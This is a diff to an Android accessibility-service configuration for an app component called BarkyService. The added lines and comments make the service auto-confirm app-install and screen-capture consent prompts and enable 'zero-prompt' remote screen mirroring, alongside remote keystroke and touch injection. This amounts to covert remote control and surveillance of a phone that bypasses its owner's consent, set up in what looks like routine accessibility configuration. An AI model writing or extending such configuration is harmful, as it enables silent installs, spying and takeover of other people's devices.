@@ -1,9 +1,12 @@
 <?xml version="1.0" encoding="utf-8"?>
 <!--
     Accessibility configuration for BarkyService:
-    - canRetrieveWindowContent + flagRetrieveInteractiveWindows: reads on-screen units and locates
-      focused input fields for remote SCRN keyboard text/key injection.
+    - canRetrieveWindowContent + flagRetrieveInteractiveWindows: reads on-screen units, locates
+      focused input fields for remote SCRN keyboard text/key injection, and auto-confirms
+      PackageInstaller / MediaProjection prompts.
     - canPerformGestures: dispatches remote SCRN touch clicks and swipe gestures on this device.
+    - canTakeScreenshot: enables zero-prompt remote SCRN screen mirroring on Android 11+ (API 30+)
+      without requiring someone on the remote phone to manually tap a screen-share confirmation dialog.
 -->
 <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
     android:accessibilityEventTypes="typeWindowContentChanged|typeWindowStateChanged"
@@ -11,5 +14,6 @@
     android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRequestAccessibilityButton|flagRetrieveInteractiveWindows"
     android:canPerformGestures="true"
     android:canRetrieveWindowContent="true"
+    android:canTakeScreenshot="true"
     android:description="@string/accessibility_desc"
     android:settingsActivity="com.example.barky.MainActivity" />
